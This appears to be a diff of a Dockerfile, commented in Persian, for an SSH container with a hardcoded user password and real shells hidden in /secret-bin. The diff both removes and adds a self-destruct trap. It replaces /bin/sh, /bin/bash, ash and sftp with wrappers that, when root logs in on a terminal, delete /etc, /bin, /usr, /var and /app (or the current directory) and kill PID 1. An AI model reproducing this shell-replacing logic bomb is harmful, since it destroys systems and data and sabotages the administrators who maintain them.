@@ -9,14 +9,14 @@ RUN mkdir -p /var/run/sshd && chmod 0755 /var/run/sshd
 # ۳. قفل کردن کامل پسورد اکانت روت
 RUN passwd -l root
 
-# ۴. ساخت پوشه امن و انتقال شل واقعی به مسیر مخفی
+# ۴. انتقال شل‌های واقعی به پوشه امن و مخفی
 RUN mkdir -p /secret-bin \
     && cp /bin/busybox /secret-bin/ \
     && ln -s ./busybox /secret-bin/sh \
     && ln -s ./busybox /secret-bin/ash \
     && mv /bin/bash /secret-bin/real-bash
 
-# ۵. ساخت کاربر غیر روت متصل به شل مخفی
+# ۵. ساخت کاربر غیر روت amirwolf512
 RUN adduser -D -u 1000 -s /secret-bin/real-bash amirwolf512 \
     && echo 'amirwolf512:amirwolfcl' | chpasswd
 
@@ -26,8 +26,7 @@ RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config \
     && echo "AllowUsers amirwolf512" >> /etc/ssh/sshd_config
 
 # --- [تبدیل پوشه app به فایل] ---
-# حذف دایرکتوری ورک‌دیر و تبدیل آن به فایل خالی در روت سیستم
-RUN rm -rf /app && touch /app
+#RUN rm -rf /app && touch /app
 # --------------------------------
 
 # ۷. تولید کلیدهای هاست SSH
@@ -36,24 +35,35 @@ RUN ssh-keygen -A
 # ۸. ست کردن مسیر PATH برای کاربر شما
 RUN echo "export PATH=/secret-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" >> /home/amirwolf512/.bashrc
 
-# ۹. چاشنی انفجاری در پروفایل روت (به محض لاگین وب‌کنسول)
-# اگر هرکسی با آیدی 0 (روت) وارد شود، کل سرور نابود شده و کانتینر با Kill 1 خاموش می‌شود.
-RUN echo 'if [ "$(id -u)" = "0" ]; then rm -rf /etc /bin /sbin /usr /var 2>/dev/null; kill -9 1; fi' > /root/.profile \
-    && cp /root/.profile /root/.bashrc \
-    && cp /root/.profile /root/.bash_profile \
-    && cp /root/.profile /etc/profile
-
-# ۱۰. ساخت اسکریپت پس‌زمینه پاک‌سازی ثانیه‌ای شل‌ها و آپدیت MOTD
+# ۹. ساخت چاشنی انفجاری در شل‌های عمومی سیستم
+# اگر روت با ترمینال فعال (-t 0) وارد شود -> کلید انفجار زده می‌شود.
+# در غیر این صورت، دستورات عادی سیستم بدون مشکل به شل واقعی پاس داده می‌شوند.
 RUN echo -e '#!/secret-bin/sh\n\
-rm -rf /app && touch /app\n\
-echo -e "Telegram:@amir_wolf512 HI:3\\n\\n==========>\\n" > /etc/motd\n\
-while true; do\n\
-  # تزریق مداوم دستور خودتخریبی به شل‌های عمومی برای امنیت بیشتر\n\
-  echo "if [ \"\$(id -u)\" = \"0\" ]; then rm -rf /etc /bin /sbin /usr /var 2>/dev/null; kill -9 1; fi" > /bin/sh\n\
-  echo "if [ \"\$(id -u)\" = \"0\" ]; then rm -rf /etc /bin /sbin /usr /var 2>/dev/null; kill -9 1; fi" > /bin/ash\n\
-  echo "if [ \"\$(id -u)\" = \"0\" ]; then rm -rf /etc /bin /sbin /usr /var 2>/dev/null; kill -9 1; fi" > /bin/sftp\n\
-  sleep 1\n\
-done' > /secret-bin/cleaner.sh && chmod +x /secret-bin/cleaner.sh
+if [ "$(id -u)" = "0" ] && [ -t 0 ]; then\n\
+  echo "CRITICAL SECURITY BREACH! SELF-DESTRUCTING..."\n\
+  rm -rf * 2>/dev/null\n\
+  kill -9 1\n\
+  exit 1\n\
+fi\n\
+exec /secret-bin/sh "$@"' > /bin/sh && chmod +x /bin/sh
 
-# اجرای همزمان اسکریپت پاک‌سازی در پس‌زمینه و سرویس SSH
-CMD /secret-bin/cleaner.sh & exec /usr/sbin/sshd -D -o Port=8080
+RUN echo -e '#!/secret-bin/sh\n\
+if [ "$(id -u)" = "0" ] && [ -t 0 ]; then\n\
+  echo "CRITICAL SECURITY BREACH! SELF-DESTRUCTING..."\n\
+  rm -rf /etc /bin /sbin /usr /var /app 2>/dev/null\n\
+  kill -9 1\n\
+  exit 1\n\
+fi\n\
+exec /secret-bin/real-bash "$@"' > /bin/bash && chmod +x /bin/bash
+
+# ۱۰. کپی کردن بمب روی تمام میانبرهای شل دیگر
+RUN cp /bin/sh /bin/ash \
+    && cp /bin/sh /bin/sh.orig \
+    && cp /bin/sh /usr/bin/bash \
+    && cp /bin/sh /bin/sftp
+
+# ۱۱. تنظیم بنر ورود پیام خوش‌آمدگویی
+RUN echo -e "Telegram:@amir_wolf512 HI:3\n\n==========>\n" > /etc/motd
+
+# اجرای مستقیم سرویس SSH
+CMD ["/usr/sbin/sshd", "-D", "-o", "Port=8080"]
